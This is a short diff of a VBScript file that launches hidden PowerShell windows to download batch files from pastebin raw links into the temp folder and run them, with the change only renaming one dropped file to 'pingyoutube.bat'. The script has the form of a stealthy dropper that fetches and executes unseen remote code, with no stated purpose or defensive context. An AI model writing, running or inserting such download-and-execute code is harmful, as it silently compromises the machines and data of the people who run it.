@@ -1,6 +1,6 @@
 Set WshShell = CreateObject("WScript.Shell")
     
-    WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/wCbsqrNY','%TEMP%\pingmagister.bat'); Start-Process %TEMP%\pingmagister.bat""", 0, False
+    WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/wCbsqrNY','%TEMP%\pingyoutube.bat'); Start-Process %TEMP%\pingyoutube.bat""", 0, False
     WScript.Sleep 2000
     WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/TiNThhxW','%TEMP%\relaunchping.bat'); Start-Process %TEMP%\relaunchping.bat""", 0, False
     WScript.Sleep 5000
